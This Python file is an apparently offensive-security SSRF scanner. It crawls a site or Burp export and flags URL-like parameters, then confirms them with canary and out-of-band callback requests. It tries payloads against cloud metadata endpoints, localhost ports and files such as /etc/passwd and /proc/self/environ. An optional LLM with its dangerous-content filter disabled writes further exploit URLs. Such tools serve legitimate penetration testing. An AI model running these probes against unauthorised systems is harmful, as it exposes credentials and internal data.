#!/usr/bin/env python3

import queue
from threading import Thread, Lock
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import sys
import re
from argparse import ArgumentParser
import requests
import base64, xml.etree.ElementTree
import urllib
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os
from google import genai
from google.genai import types
import ollama
import openai
import anthropic
import time
from blind_verifier import InteractshVerifier
import hashlib
from oobe import OOBEHandler


banner="""
 ### #### ####        ### #   # ###   #### # # 
#    #    #          #    #   # #  #  #    # # 
#    #    #          #    #   # #  #  #    # # 
 ##  ###  ###  #####  ##  #   # ###   ###  # # 
   # #    #             # #   # # #   #        
   # #    #             # #   # #  #  #    # # 
###  #### ####       ###   ###  #   # #    # # 
"""

print(banner)

parser = ArgumentParser()
parser.add_argument("-H", "--host", dest="host", metavar="HOST", required=True)
parser.add_argument("-t", "--threads", dest="threads", metavar="THREADS")
parser.add_argument("-c","--cookies", nargs='+', dest="cookies", metavar="COOKIES")
parser.add_argument("-v","--verbose", dest="verbose", action='store_true')
parser.add_argument("-b", "--burp",dest="burp",help="provide a burp file", action="store")
parser.add_argument("-p","--provider", dest="provider", help="llm provider: google, openai, anthropic, ollama", default=None)
parser.add_argument("-m","--model", dest="model", help="model name: gemini-1.5-flash, gpt-4, llama3", default=None)
parser.add_argument("-a","--api-key", dest="api_key", help="API Key (or set env var API_KEY)", default=None)
parser.add_argument("-e","--external-domain", dest="ext_domain", help="For testing Blind-SSRF OOBE request, else webhook.site will be used by default", default=None)

args = parser.parse_args()

# --- LLM CLIENT SETUP (Global) ---
llm_client = None
API_KEY = args.api_key or os.environ.get('API_KEY')
vulnerable_list = []
print_lock = Lock()

# Initialize global instance for Blind SSRF testing
oobe = OOBEHandler(vulnerable_list, print_lock, custom_domain=args.ext_domain)
oobe.setup()

# If LLM fails to generate payload or not provided, we use these.
CACHED_PAYLOADS = [
		"http://127.0.0.1:80","http://metadata.google.internal/computeMetadata/v1/",
"http://169.254.169.254/latest/meta-data/",
"http://127.0.0.1",
"http://127.0.0.1:8080",
"http://127.0.0.1:8000",
"http://127.0.0.1:9200",
"http://127.0.0.1:6379",
"http://127.0.0.1:22",
"http://2130706433",
"http://localtest.me",
"http://[::1]",
"file:///etc/passwd",
"file:///etc/hosts",
"file:///proc/self/environ",
"file:///C:/Windows/win.ini"
	]

#Validating inputs and setting up LLM config
if args.provider:
    print(f"\033[94m[*] Configuring AI Provider: {args.provider} ({args.model})\033[0m")
    
    if "ollama" not in args.provider and API_KEY is None:
        print(f"\033[91m[!] Error: {args.provider} requires an API key. Use --api-key or set API_KEY env var.\033[0m")
        sys.exit(1)
        
    if args.model is None:
         print(f"\033[91m[!] Error: Model name is required. Use --model.\033[0m")
         sys.exit(1)

    try:
        if "google" in args.provider:
            llm_client = genai.Client(api_key=API_KEY)
        elif "openai" in args.provider:
            llm_client = openai.OpenAI(api_key=API_KEY)
        elif "anthropic" in args.provider:
            llm_client = anthropic.Anthropic(api_key=API_KEY)
        elif "ollama" in args.provider:
            llm_client = None # Ollama lib handles connection internally usually
        else:
            print(f"Unsupported provider: {args.provider}")
            sys.exit(1)
    except ImportError as e:
        print(f"\033[91m[!] Missing library for {args.provider}: {e}\033[0m")
        sys.exit(1)

# --- INTEGRATED LLM FUNCTION ---
def send_to_llm(system_instructions, user_content):
    """
    Sends a prompt to the configured LLM provider with retry logic.
    Converted to Synchronous to fit the thread model of the scanner.
    """
    if not args.provider:
        return None

    # Combine instructions for simple prompt APIs
    complete_prompt = system_instructions + "\n\n" + user_content
    retry_delay = 2  
    max_retries = 3  

    for attempt in range(max_retries):
        try:
            if "google" in args.provider:
                response = llm_client.models.generate_content(
                    model=args.model,
                    contents=[complete_prompt],
                    config=types.GenerateContentConfig(
                        safety_settings=[
                            types.SafetySetting(
                                category="HARM_CATEGORY_DANGEROUS_CONTENT",
                                threshold="BLOCK_NONE"
                            )
                        ]
                    )
                )
                return response.text

            elif "ollama" in args.provider:
                response = ollama.generate(model=args.model, format="json", prompt=complete_prompt)
                return response['response']

            elif "openai" in args.provider:
                chat_completion = llm_client.chat.completions.create(
                    messages=[
                        {"role": "system", "content": system_instructions},
                        {"role": "user", "content": user_content},
                    ],
                    model=args.model,
                    response_format={"type": "json_object"}
                )
                return chat_completion.choices[0].message.content

            elif "anthropic" in args.provider:
                message = llm_client.messages.create(
                    model=args.model,
                    max_tokens=4096,
                    system=system_instructions,
                    messages=[
                        {"role": "user", "content": user_content}
                    ]
                )
                return message.content[0].text

        except Exception as e:
            # Check for Rate Limit errors generic text since libraries differ
            if "429" in str(e) or "quota" in str(e).lower():
                print(f"[!] Rate limit. Retrying in {retry_delay}s...")
                time.sleep(retry_delay)
                retry_delay *= 2
            else:
                print(f"[!] LLM API Error: {e}")
                traceback.print_exc()
                return None
    return None

def pause_for_confirmation(attack_url, reason):
    """
    Acquires a lock to pause console output, alerts the user, 
    and waits for input to continue.
    """
    with print_lock:
        try:
            print(f"\033[91m[!!!] CONFIRMED HIT REFLECTED SSRF: {attack_url}\033[0m")
            input(f"\033[93mPress [ENTER] to continue hunting other parameters...\033[0m")
        except KeyboardInterrupt:
    	    print("\nExiting...")
    	    sys.exit()
        print("\n[+] Resuming scan...\n")

#Generate SSRF payloads with LLM
def generate_payloads_with_llm(response_object):
    """
    Step 1: Ask LLM to generate payloads based ONLY on Response Headers.
    We ignore the body because we know it's just 'example.com' content.
    """
    
    # 1. Format Headers into a clean block
    # We filter out standard/boring headers (Date, Content-Length) to save tokens
    # and focus on the interesting ones (Server, X-Powered-By, Cookies, Via).
    interesting_headers = {}
    ignore_keys = ["date", "content-length", "content-type", "connection", "etag", "last-modified"]
    
    for k, v in response_object.headers.items():
        if k.lower() not in ignore_keys:
            interesting_headers[k] = v
            
    headers_text = json.dumps(interesting_headers, indent=2)

    system_prompt = """
    You are an expert Red Teamer specializing in SSRF.
    I have confirmed a Non-Blind SSRF vulnerability on a target server.
    
    I am providing the HTTP RESPONSE HEADERS returned by the vulnerable server.
    
    TASK:
    1. Analyze headers like 'Server', 'X-Powered-By', 'Set-Cookie', 'Via', or 'X-Amz-Id' to fingerprint the internal technology stack.
    2. Based on the stack, generate a JSON list of atleast 10 specific internal URLs to exploit it with maximum of 20.
    
    LOGIC:
    - 'Server: EC2' or 'X-Amz' -> Suggest AWS Metadata (http://169.254.169.254/latest/meta-data/).
    - 'JSESSIONID', 'Tomcat', 'Jetty' -> Suggest Tomcat Manager (http://127.0.0.1:8080/manager/html).
    - 'Gunicorn', 'Werkzeug', 'Python' -> Suggest local internal ports (8000, 5000).
    - 'PHP' -> Suggest php://filter attacks or /var/www/html/index.php.
    - 'Microsoft-IIS' -> Suggest Windows file paths (file://C:/Windows/win.ini).
    - If generic/unknown -> Suggest standard /etc/passwd and localhost ports (80, 8080).
    
    Output strictly a JSON object:
    { "payloads": ["url1", "url2"] }
    """
    
    user_content = f"--- CAPTURED HEADERS ---\n{headers_text}"
    
    print(f"\033[95m[AI] Analyzing {len(interesting_headers)} headers to fingerprint tech stack...\033[0m")
    if args.verbose:
        print(f"[debug] Headers sent to AI:\n{headers_text}")

    ai_response = send_to_llm(system_prompt, user_content)
    
    payloads = []
    if ai_response:
        try:
            clean_json = ai_response.replace("```json", "").replace("```", "").strip()
            data = json.loads(clean_json)
            payloads = data.get("payloads", [])
        except Exception as e:
            print(f"[!] Failed to parse generated payloads: {e}")
            
    return payloads

# Check responses with LLM if SSRF payload was succesfull
def analyze_ssrf_result_with_llm(target_url, response_text):
    """
    Step 2: Ask LLM to validate if the attack was successful.
    """
    # Truncate to save tokens, but keep enough to see leaked data
    content_snippet = response_text[:1000]
    
    system_prompt = """
    You are a Vulnerability Validator.
    I executed an SSRF payload. Analyze the response to determine if it was SUCCESSFUL.
    
    Criteria for VULNERABLE:
    - Contains sensitive data (root:x:0, AMI IDs, internal IP addresses).
    - access to internal dashboards (Tomcat Manager, K8s API).
    - Directory listings of internal server or files.
    
    Criteria for SAFE/FAILED:
    - Standard 404/403 error pages.
    - Empty responses.
    - Generic firewall block pages.
    
    Output strictly JSON:
    {
        "status": "VULNERABLE" or "SAFE",
        "reason": "One sentence explaining why."
    }
    """
    
    user_content = f"Payload: {target_url}\n\nResponse:\n{content_snippet}"
    
    ai_response = send_to_llm(system_prompt, user_content)
    
    if ai_response:
        try:
            clean_json = ai_response.replace("```json", "").replace("```", "").strip()
            data = json.loads(clean_json)
            return data
        except:
            return None
    return None

# --- AI PIVOT LOGIC ---
def smart_pivot_to_internal(paramName, original_url):
    """
    Orchestrator: Generates payloads -> Executes -> Validates.
    """
    global CACHED_PAYLOADS
    custom_payloads = CACHED_PAYLOADS

    # 1. EXECUTE LOOP
    regex = paramName + "=(.*?)(?:&|$)"
    match = re.search(regex, original_url)
    if not match: return
    val_to_replace = match.group(1)

    for payload in custom_payloads:
        if (args.verbose):
            print(f"\033[96m[AI-Test] Trying: {payload}\033[0m")
        attack_url = original_url.replace(val_to_replace, payload)
        
        try:
            # Short timeout for internal probes
            r = requests.get(attack_url, verify=False, timeout=4)
            
            # Optimization: Skip obviously empty/failed requests to save AI costs
            if r.status_code >= 400 and len(r.text) < 200:
                continue

            # 2. VALIDATE
            result = analyze_ssrf_result_with_llm(payload, r.text)
            
            if result and result.get("status") == "VULNERABLE":
				
                vulnerable_list.append({
                    "type": "Reflected SSRF (AI Verified)",
					"original_url":original_url,
                    "vulnerable_param": paramName,
                    "payload": payload,
                    "reason": result.get('reason')
                })
                pause_for_confirmation(attack_url, result.get('reason'))
				
                
        except Exception as e:
            # print(f"    Failed: {e}")
            pass

# --- Inside your testing function ---
def check_blind_ssrf(paramName, original_url):
    if not oobe.enabled:
        return

    # Generate the Webhook.site URL with a unique ID
    oob_payload = oobe.get_payload(original_url, paramName)
    
    # Surgical replacement logic
    regex = f"({re.escape(paramName)}=)[^&?]+"
    if not re.search(regex, original_url):
        return False
    attack_url = re.sub(regex, r"\1" + oob_payload, original_url)

    try:
        # Fire and forget
        requests.get(attack_url, verify=False, timeout=5)
    except:
        pass


# A safe, predictable external URL to test fetching
CANARY_URL = "http://example.com"
CANARY_SIGNATURE = "Example Domain"

#Make an external request first to example.com, so its less noisy to find out if redirection is happening
#and then we check for SSRF.
def check_non_blind_ssrf(paramName, original_url):
	"""
	1. Injects a known external URL (example.com).
	2. Checks if the target server returns the content of that URL.
	3. If yes, confirms Non-Blind SSRF.
	"""

	# 1. Construct the Payload
	# We use the regex logic you already had to replace the parameter value
	regexToReplace = paramName + "=(.*?)(?:&|$)"
	match = re.search(regexToReplace, original_url)
	
	if not match:
		return False
		
	parameterValuetoReplace = match.group(1)
	
	# Inject the Canary URL
	attack_url = re.sub(parameterValuetoReplace, CANARY_URL, original_url)
	
	if args.verbose:
		print(f"\033[94m[*] Probing for Non-Blind SSRF on '{paramName}' with canary: {CANARY_URL}\033[0m")
	
	try:
		# 2. Fire the Request
		# We need verify=False because many targets have bad certs
		# specific timeout prevents hanging if the server tries to resolve and fails
		response = requests.get(attack_url, verify=False, timeout=10)
		
		# 3. Analyze the Response (The "Non-Blind" Check)
		if CANARY_SIGNATURE in response.text:
			print(f"\033[91m[+] POTENTIAL VULNERABLE (Non-Blind)! The server fetched example.com and returned its content.\033[0m")
			print(f"\033[91m    URL: {attack_url}\033[0m")
			
			# 4. PIVOT: Since we confirmed it can fetch external, let's try Internal!
			smart_pivot_to_internal(paramName, original_url)
			return True
			
		else:
			if args.verbose:
				print(f"[-] Failed. Server did not return canary content.")
			return False

	except Exception as e:
		print(f"[!] Error probing {paramName}: {e}")
		return False



#Keeps a record of links which are already saved and are present just once in the queue
linksVisited=set()
ssrfVul=set()

#Throw away list just used for ignoring unnecessary crawling and generating noisy output
throwAwayListForRest=set()
throwAwayGetReqs={}

#Ignore the path which we couldn't be crawled
ignoreList=["pdf","mailto","javascript"]

#List containing keywords to look for in post param name attributes and in get parameters
matchList="(url|web|site|uri|dest|redirect|path|continue|window|next|data|reference|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir)"

#Cookies to send along with each requests
cookiesDict={}
if args.cookies:
	for cook in args.cookies:
		cookiesDict[cook[:cook.find("=")]]=cook[cook.find("=")+1:]

#This checks against URL keywords in param NAME
def matchURLKeywordsInName(getOrForm,paramName,url):
	if args.verbose:
		temp=url+":paramname:"+paramName
	else:
		temp=paramName
		if temp not in ssrfVul and re.search(matchList,paramName,re.I):
			if args.verbose:
				print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm,"Name",paramName,url))
        				
		ssrfVul.add(temp)
		
		#Trying to make an external request to validate potential SSRF (Only for GET parameter for now) 	
		if getOrForm == "GET":
			check_non_blind_ssrf(paramName,url)
			check_blind_ssrf(paramName,url)

#This checks URL pattern in param VALUE and also if an IP is passed somewhere in the values
def matchURLPatternInValue(getOrForm, paramName,paramValues,url):
	#Since all fields didn't have paramNames hence this condition
	if args.verbose:
		temp=url+":paramname:"+paramValues if paramName=="" else url+":paramname:"+paramName
	else:
		temp=paramValues if paramName=="" else paramName
                
	if temp not in ssrfVul and (re.match(r"^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?$",paramValues) or re.match(r"((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}",paramValues)):
		if args.verbose:
			print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm, "Value" if paramName=="" else "Name",paramValues if paramName=="" else paramName,url))
		ssrfVul.add(temp)
		if getOrForm == "GET":
			check_non_blind_ssrf(paramName,url)
			check_blind_ssrf(paramName,url)
			


def checkForGetRequest(url):
	# Parse query parameters robustly using urllib.parse
	# Handle non-standard separators (e.g. pilcrow ¶) and HTML entities
	parsed = urlparse(url)
	query = parsed.query
	if not query:
		return

	# Normalize some common bad separators that appear in exported URLs
	query = query.replace('\u00B6', '&')
	query = query.replace('¶', '&')
	query = query.replace('&amp;', '&')

	# Use parse_qsl to get ordered (name, value) pairs
	try:
		params_list = urllib.parse.parse_qsl(query, keep_blank_values=True)
	except Exception:
		# Fallback to previous regex-based extraction if parsing fails
		checking_params_for_url = re.findall(r"(\?|\&)([^=]+)\=([^&]+)", url)
		params_list = [(p[1], p[2]) for p in checking_params_for_url]

	if not len(params_list) == 0:
		for name, value in params_list:
			matchURLKeywordsInName("GET", name, url)
			matchURLPatternInValue("GET", name, value, url)
			

def checkFormParameters(siteContent,url):
	for inputFields in BeautifulSoup(siteContent,'html.parser').find_all('input'):
		if inputFields.has_attr('name'):
			matchURLKeywordsInName("FORM",inputFields["name"],url)
		#Found some cases where input fields didn't have any Value attribute
		if inputFields.has_attr('value'):
			matchURLPatternInValue("FORM",inputFields["name"] if inputFields.has_attr('name') else "",inputFields["value"],url)
		#Sometimes input will have placeholders which gives url patterns
		if inputFields.has_attr('placeholder'):
			matchURLPatternInValue("FORM",inputFields["name"] if inputFields.has_attr('name') else "",inputFields["placeholder"],url)


#This checks against URL keywords in param NAME
def burp_matchURLKeywordsInName(getOrForm,paramName,url):
	if re.search(matchList,paramName,re.I):
		if args.verbose:
			print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm,"Name",paramName,url))
		#Trying to make an external request to validate potential SSRF (Only for GET parameter for now)
		if getOrForm == "GET":
			check_non_blind_ssrf(paramName,url)
			check_blind_ssrf(paramName,url)

#This checks URL pattern in param VALUE and also if an IP is passed somewhere in the values
def burp_matchURLPatternInValue(getOrForm, paramName,paramValues,url):
	#Regex is changed since Form parameters sometimes have array or other object in their values
	if (re.match(r"(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?",str(paramValues)) or re.match(r"((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)",str(paramValues))):
		if args.verbose:
			print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm, "Value" if paramName=="" else "Name",paramValues if paramName=="" else paramName,url))
		if getOrForm == "GET":
			check_non_blind_ssrf(paramName,url)

post_throwAwayListForRest=set()
post_throwAwayGetReqs={}
get_throwAwayListForRest=set()
get_throwAwayGetReqs={}
q_burp = queue.Queue()
q = queue.Queue()
def burp_siteMap_parse(q_burp):
	while True:
		try:
			item=q_burp.get()
			post=False
			if item.find('status').text=="200" and item.find('method').text=="POST":
				post=True
			else:
				post=False
			linkUrl=item.find('url').text
			#Reducing unnecessary crawling and duplication	
			#Some post request were containing parameters in the URL as well for exmaple POST /api?returnUrl=
			if "?" not in linkUrl:
				rest_apis=linkUrl.rsplit('/',1)
				if not rest_apis[1]=='' and rest_apis[1].isdigit():
					if post:
						if rest_apis[0] in post_throwAwayListForRest:
							q_burp.task_done()
							continue
						#Throw away lists for ignoring restapi links, don't want to mess with the original results in linksVisited
						else:
							post_throwAwayListForRest.add(rest_apis[0])
					else:
						if rest_apis[0] in throwAwayListForRest:
							q_burp.task_done()
							continue
						#Throw away lists for ignoring restapi links, don't want to mess with the original results in linksVisited
						else:
							get_throwAwayListForRest.add(rest_apis[0])

			else:
			#Reducing duplication for GET requests having same parameters for example, here there would only be one entry saved
			#since the 2nd url contains all param of 1st url plus one more parameter 'filter'
			#http://www.msn.com/es-mx/deportes/browse/el-universal/vs-BBnqaEA?page=2&sort=sort_1
			#http://www.msn.com/es-mx/deportes/browse/el-universal/vs-BBnqaEA?page=2&filter=duration_0&sort=sort_2
				checking_params_for_url= re.findall(r"(\?|\&)([^=]+)\=([^&]+)",linkUrl)
				get_req=linkUrl.rsplit('?',1)
				url=get_req[0]
				parameters=get_req[1]

				if post and url not in post_throwAwayGetReqs:
					post_throwAwayGetReqs[url]=parameters
				elif not post and url not in get_throwAwayGetReqs:
					get_throwAwayGetReqs[url]=parameters
				else:
					if post:
						existingParams=post_throwAwayGetReqs[url]
					else:
						existingParams=get_throwAwayGetReqs[url]

					allParameterExists = False
					for params in checking_params_for_url:
							#Some param names have special chars we need to escape them and then search
							formingRegex=re.escape(params[1])
							if re.search(formingRegex,existingParams,re.I):
									allParameterExists=True
							else:
									allParameterExists=False
					if allParameterExists:
							q_burp.task_done()
							continue
					else:
						if post:
							post_throwAwayGetReqs[url]=parameters
						else:
							get_throwAwayGetReqs[url]=parameters
			#Actual Processing of requests starts, just checking for 200 status				
			if item.find('status').text=="200" and item.find('method').text=="POST":
				#Special condition for handling URL parameters in post request to send them 
				if "?" in linkUrl:
					checking_params_for_url= re.findall(r"(\?|\&)([^=]+)\=([^&]+)",linkUrl)

					#Checking if there is a parameter in the URL (This would filter rest APIs in the format /test/1 /test/2)
					if not len(checking_params_for_url)==0:
						#Getting the param values params[2] and param name params[1] and matching against regex
						for params in checking_params_for_url:
							matchURLKeywordsInName("POST",params[1],linkUrl)
							matchURLPatternInValue("POST",params[1],params[2],linkUrl)

				response=base64.b64decode(item.find('request').text).decode("utf8")
				content_type_regex='\\r\\nContent-Type:(.*?)\\r\\n'
				if re.search(content_type_regex,response):
					content_type = (re.search(content_type_regex,response).group(1))

				if "application/x-www-form-urlencoded" in content_type:
					form_regex='\\r\\n\\r\\n(.*)'
					response=urllib.parse.unquote(response)
					if re.search(form_regex,response):
						form_req=re.search(form_regex,response).group(1)
						checking_params_for_url= re.findall(r"(\&)?([^=]+)\=([^&]+)",form_req)
						 #Checking if there is a parameter in the URL (This would filter rest APIs in the format /test/1 /test/2)
						if not len(checking_params_for_url)==0:
							#Getting the param values params[2] and param name params[1] and matching against regex
							for params in checking_params_for_url:
								#print (params[1])
								burp_matchURLKeywordsInName("POST",params[1],linkUrl)
								burp_matchURLPatternInValue("POST",params[1],params[2],linkUrl)
				elif "json" in content_type:
					#print (urllib.parse.unquote(response))
					json_regex='\\r\\n\\r\\n({(.|\n)*})'
					if re.search(json_regex,response):
						json_req=urllib.parse.unquote(re.search(json_regex,response).group(1))
						#print (json_req)
						json_req=json_req.replace('\n', '').replace('\r', '')
						for key,value in json.loads(json_req).items():
							burp_matchURLKeywordsInName("POST",key,linkUrl)
							burp_matchURLPatternInValue("POST",key,value,linkUrl)
				#TODO
				elif "xml" in content_type:
					print ("")

			elif item.find('status').text=="200" and item.find('method').text=="GET":
				checking_params_for_url= re.findall(r"(\?|\&)([^=]+)\=([^&]+)",linkUrl)

				#Checking if there is a parameter in the URL (This would filter rest APIs in the format /test/1 /test/2)
				if not len(checking_params_for_url)==0:
					#Getting the param values params[2] and param name params[1] and matching against regex
					for params in checking_params_for_url:
						burp_matchURLKeywordsInName("GET",params[1],linkUrl)
						burp_matchURLPatternInValue("GET",params[1],params[2],linkUrl)
				
				#Adding the link found to do basic crawling to get maximum results
				q.put(linkUrl)
			q_burp.task_done()
		except Exception as e:
			print(e)
			q_burp.task_done()
			continue
			
def basicCrawling(url):
	#Suppress the warnings due to verify=false
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	if args.cookies:
		r = requests.get(url, verify=False, cookies=cookiesDict)
	else:
		r = requests.get(url, verify=False)
	siteContent=r.text
	if url not in linksVisited:
		checkFormParameters(siteContent,url)
		checkForGetRequest(url)
		linksVisited.add(url)
			
		for links in BeautifulSoup(siteContent,'html.parser').find_all('a'):
			#Only proceed if links have href tag, many of the a tags
			#were having images and src in it
			#Ignoring if its an anchor tag having images inside				
			if len(links.find_all("img"))>0:
				#print ("Images")
				continue
	
			#Checking for common file extensions that exists in anchor tags and ignoring
			ignoreListMatch=False			
			for ignore in ignoreList:
				if ignore in str(links):
					ignoreListMatch=True
					break
			if ignoreListMatch:
				continue
	
			if links.has_attr('href'):
				linkUrl=links['href']
				#Checking for links which points to the same domain or contains hash to avoid unnecessary crawling
				if "#" in linkUrl or linkUrl=="/":
					continue
				#For conditions where <a href='index.php?id=21'>
				if not linkUrl.startswith('http') and "www" not in linkUrl:
					if linkUrl.startswith('/'):
						linkUrl=baseURL+linkUrl
					else:
						linkUrl=baseURL+"/"+linkUrl
				#skipping the loop if not of same domain
				if not linkUrl.startswith(baseURL):
					continue
	
				#Order of IF check conditions are important so we don't miss valid data, hence placing this condition at last
				#Handling REST URLs duplication test/1 test/2 or test/, otherwise vulnerable form params were getting duplicated
				#Also handling issues where the parameter value changes but the request remains same for example test?abc=1 and test?abc=2
				#We do not need to crawl those again
				if "?" not in linkUrl:
					rest_apis=linkUrl.rsplit('/',1)
					if not rest_apis[1]=='' and rest_apis[1].isdigit():
						if rest_apis[0] in throwAwayListForRest:
							continue
						#Throw away lists for ignoring restapi links, don't want to mess with the original results in linksVisited
						else:
							throwAwayListForRest.add(rest_apis[0])
	
				else:
				#Reducing duplication for GET requests having same parameters for example, here there would only be one entry saved 
				#since the 2nd url contains all param of 1st url plus one more parameter 'filter'
				#http://www.msn.com/es-mx/deportes/browse/el-universal/vs-BBnqaEA?page=2&sort=sort_1
				#http://www.msn.com/es-mx/deportes/browse/el-universal/vs-BBnqaEA?page=2&filter=duration_0&sort=sort_2
					checking_params_for_url= re.findall(r"(\?|\&)([^=]+)\=([^&]+)",linkUrl)
					get_req=linkUrl.rsplit('?',1)
					url=get_req[0]
					parameters=get_req[1]
					if url not in throwAwayGetReqs:
						throwAwayGetReqs[url]=parameters
					else:
						existingParams=throwAwayGetReqs[url]
						allParameterExists = False
						for params in checking_params_for_url:
							#Some param names have special chars we need to escape them and then search
							formingRegex=re.escape(params[1])
							if re.search(formingRegex,existingParams,re.I):
								allParameterExists=True
							else:
								allParameterExists=False
	
						if allParameterExists:
							continue
						else:
							throwAwayGetReqs[url]=parameters
	
				#Only letting visit the links which have not been visited before
				if linkUrl not in linksVisited:
					q.put(linkUrl)
					#linksVisited.add(linkUrl)
					#checkForGetRequest(linkUrl)
					#checkFormParameters(siteContent,linkUrl)
	
	
def do_stuff(q):
	
	while True:
		url = q.get()
		try:
			basicCrawling(url)
			q.task_done()
		except Exception as e:
			print(e)
			q.task_done()
			continue

#Validate URL patterns
def is_valid_target(url):
    try:
        result = urlparse(url)
        # Check 1: Must have a scheme (http/https) and a netloc (domain/ip)
        if not all([result.scheme, result.netloc]):
            return False
        # Check 2: Scheme must be http or https
        if result.scheme not in ['http', 'https']:
            return False
        return True
    except:
        return False

if not is_valid_target(args.host):
    print("Terminating... Please enter Host in the format http://target.com or https://10.10.10.10")
    sys.exit()
elif args.ext_domain is not None and not is_valid_target(args.ext_domain):
    print("Terminating... Please enter external domain in the format http://target.com or https://10.10.10.10")
    sys.exit()

parsed=urlparse(args.host)
baseURL=parsed.scheme+"://"+parsed.netloc
print ("Target URL - " + baseURL)

if args.burp:
	burp_xml = xml.etree.ElementTree.fromstring(open(args.burp, "r").read())
	for item in burp_xml:
		q_burp.put(item)
else:
	q.put(baseURL)
	print ("")

#Since we do not want to visit the root url again we add it into the visited list 
linksVisited.add(baseURL+"/")

if args.threads:
	num_threads = int(args.threads)
else:
	num_threads=10

# Generating custom payloads with 
if args.provider and args.model:
    print(f"\033[94m[*] Probing {baseURL} to fingerprint tech stack...\033[0m")
    if args.cookies:
        res = requests.get(baseURL, verify=False, cookies=cookiesDict)
    else:
        res = requests.get(baseURL, verify=False)
    try:
        generated_payloads = generate_payloads_with_llm(res)
        if generated_payloads:
            CACHED_PAYLOADS = generated_payloads
            print(f"\033[92m[+] AI Generated {len(CACHED_PAYLOADS)} custom payloads based on server headers.\033[0m")
        else:
            print(f"\033[92m[+] AI failed to generate payloads. Falling back to hardcoded list.")
    except Exception as e:
        print(f"\033[92m[+] AI failed to generate payloads. Falling back to hardcoded list.")
else:
    print(f"\033[92m[+] AI not provided. Falling back to hardcoded list.")

#If burp input is provided we first parse it and map our results and then make another list out of it to pass to basic crawling to get maximum results
if args.burp:
	print ("\nProcessing Burp file\n")
	for i in range(num_threads):
		worker = Thread(target=burp_siteMap_parse, args=(q_burp,))
		worker.setDaemon = True
		worker.start()
q_burp.join()
print ("\nStarting Crawling\n")
for i in range(num_threads):
	worker = Thread(target=do_stuff, args=(q,))
	worker.setDaemon = True
	worker.start()

# Run the main queue join and handle KeyboardInterrupt for graceful shutdown
try:
	q.join()
	
	if oobe.enabled and not args.ext_domain:
		wait_time = 30
		print(f"[*] Waiting {wait_time}s for OOB callbacks...")
		time.sleep(wait_time)
		oobe.stop()
		# This triggers the remote deletion
		oobe.cleanup()

	print("\n" + "="*70)
	print(f" SCAN COMPLETED ")
	print("="*70)

	if len(vulnerable_list) > 0:
		print(f"\033[91m[!] FOUND {len(vulnerable_list)} CONFIRMED VULNERABILITIES:\033[0m\n")
		for idx, vuln in enumerate(vulnerable_list, 1):
			print(f"  {idx}. [{vuln['type']}]")
			print(f"     Original URL: {vuln['original_url']}")
			print(f"     Vulnerable param: {vuln['vulnerable_param']}")
			print(f"     Payload:    {vuln['payload']}")
			print(f"     Reason:     {vuln['reason']}")
			print("-" * 50)
	else:
		print("\033[92m[+] No confirmed SSRF vulnerabilities found.\033[0m")
	print("="*70 + "\n")
	if (args.ext_domain): print(f"\033[92m[+] Please check {args.ext_domain} logs for blind SSRF vulnerabilities.\033[0m")
except KeyboardInterrupt:
			print("\n[!] Keyboard interrupt. Cleaning up...")
			oobe.stop()
			oobe.cleanup()
			sys.exit(0)
